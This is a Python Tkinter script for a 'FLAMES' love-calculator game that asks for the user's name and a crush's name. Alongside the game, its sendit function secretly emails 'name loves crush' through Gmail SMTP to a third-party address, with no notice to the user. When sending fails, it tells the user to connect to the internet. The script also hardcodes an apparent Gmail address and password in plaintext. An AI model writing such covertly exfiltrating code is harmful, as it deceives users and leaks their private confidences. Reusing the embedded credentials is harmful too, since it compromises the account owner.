from tkinter import *
from tkinter import messagebox
from random import *
import smtplib
def sendit(message):
    s=smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("roja.senthil06@gmail.com", "ROJAsenthil@123")
    s.sendmail("roja.senthil06@gmail.com", "vivekkancharla31416@gmail.com", message)
    s.quit()
w=Tk()
w.title("ANNOTHAY NAKU")
w.geometry("800x500")
w.configure(bg='pink')
def flames(s1,s2):
    s1=(s1.upper())
    s2=(s2.upper())
    p=len(s1)+len(s2)
    l=['F','L','A','M','E','S']
    for i in range(len(s1)):
        c=s1[i]
        if(c in s2):
            s1=s1.replace(c,'*',1)
            s2=s2.replace(c,'*',1)
            p-=2
    while(len(l)!=1):
        e=(l[(p-1)%(len(l))])
        l=l[(p-1)%(len(l))+1:]+l[:(p-1)%(len(l))]
    return l[0]
def percentage(c):
    if c=="F":
        print("Your Love Percentage is "+str(randint(50,55)))
    elif c=="L":
        print("Your Love Percentage is "+str(randint(90,100)))
    elif c=="A":
        print("Your Love Percentage is "+str(randint(70,80)))
    elif c=="M":
        print("Your Love Percentage is "+str(randint(95,100)))
    elif c=="E":
        print("Your Love Percentage is "+str(randint(0,5)))
    else:
        print("Your Love Percentage is "+str(randint(0,10)))
def cal():
    s1=yna.get()
    s2=cna.get()
    if(s1=='' or s2==''):
        messagebox.showerror("Error",'name cannot be empty')
    else:
        try:
            sendit(s1+" loves "+s2)
            percentage(flames(s1,s2))
        except:
            messagebox.showinfo("warning","please connect to internet")
sb=Button(w,text="SUBMIT",command=cal,bg='light green')
yna=Entry(w,bg='sky blue')
cna=Entry(w,bg='sky blue')
yn=Label(w,text="YOUR NAME   :",height=1,width=11,font=("calibre 10 bold"),bg='pink')
cn=Label(w,text="CRUSH NAME :",height=1,width=11,font=("calibre 10 bold"),bg='pink')
yn.place(relx=0.4,rely=0.4,anchor=CENTER)
cn.place(relx=0.4,rely=0.6,anchor=CENTER)
yna.place(relx=0.6,rely=0.4,anchor=CENTER)
cna.place(relx=0.6,rely=0.6,anchor=CENTER)
sb.place(relx=0.5,rely=0.8,anchor=CENTER)
w.mainloop()
